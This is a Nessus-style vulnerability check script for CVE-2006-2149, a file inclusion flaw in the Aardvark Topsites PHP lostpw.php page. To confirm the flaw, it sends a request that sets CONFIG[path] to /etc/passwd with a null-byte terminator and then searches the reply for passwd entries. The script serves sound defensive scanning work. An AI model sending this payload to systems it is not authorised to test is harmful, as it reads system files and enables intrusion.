#
# Script Written By Ferdy Riphagen 
# <f[dot]riphagen[at]nsec[dot]nl>
#
# Script distributed under the GNU GPLv2 License.
#
# Original advisory / discovered by :
# http://milw0rm.com/exploits/1732
# 


include("compat.inc");

if (description) {
 script_id(21329); 
 script_version("$Revision: 1.9 $");

 script_cve_id("CVE-2006-2149");
 script_bugtraq_id(17940);
 script_xref(name:"OSVDB", value:"25158");
 script_xref(name:"milw0rm", value:"1732");
 script_xref(name:"Secunia", value:"19911");

 script_name(english:"Aardvark Topsites CONFIG[path] Parameter Remote File Inclusion");

 script_set_attribute(attribute:"synopsis", value:
"The remote system contains a PHP application that is prone to remote
file inclusions attacks." );
 script_set_attribute(attribute:"description", value:
"Aardvark Topsites PHP is installed on the remote host.  It is an open
source toplist management system written in PHP. 

The application does not sanitize user-supplied input to the
'CONFIG[path]' variable in some PHP files, for example, 'lostpw.php'
This allows an attacker to include arbitrary files, possibly taken
from remote systems, and to execute them with privileges under which
the webserver operates. 

The flaw is exploitable if PHP's 'register_globals' setting is
enabled." );
 script_set_attribute(attribute:"see_also", value:"http://www.aardvarktopsitesphp.com/forums/viewtopic.php?t=4301" );
 script_set_attribute(attribute:"solution", value:
"Either disable PHP's 'register_globals' or upgrade to Aardvark
Topsites PHP version 5.0.2 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:N" );
script_end_attributes();

 summary["english"] = "Checks for a file include using CONFIG[path] in Aardvark Topsites";
 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2006-2009 Ferdy Riphagen");

 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

if (thorough_tests) dirs = list_uniq(make_list("/topsites", "/aardvarktopsites", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
 res = http_get_cache(item:string(dir, "/index.php"), port:port); 
 if(res == NULL) exit(0);

 if (egrep(pattern:"Powered By <a href[^>]+>Aardvark Topsites PHP<", string:res)) {
  uri = "FORM[set]=1&FORM[session_id]=1&CONFIG[path]=";
  lfile = "/etc/passwd";

  req = http_get(item:string(dir, "/sources/lostpw.php?", uri, lfile, "%00"), port:port);
  recv = http_keepalive_send_recv(data:req, port:port, bodyonly:TRUE);
  if (recv == NULL) exit(0);
  
  if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv) ||
     egrep(pattern:"Warning.+main\(/etc/passwd\\0\/.+failed to open stream", string:recv)) { 
   security_warning(port);
   exit(0);
  } 
 }
}
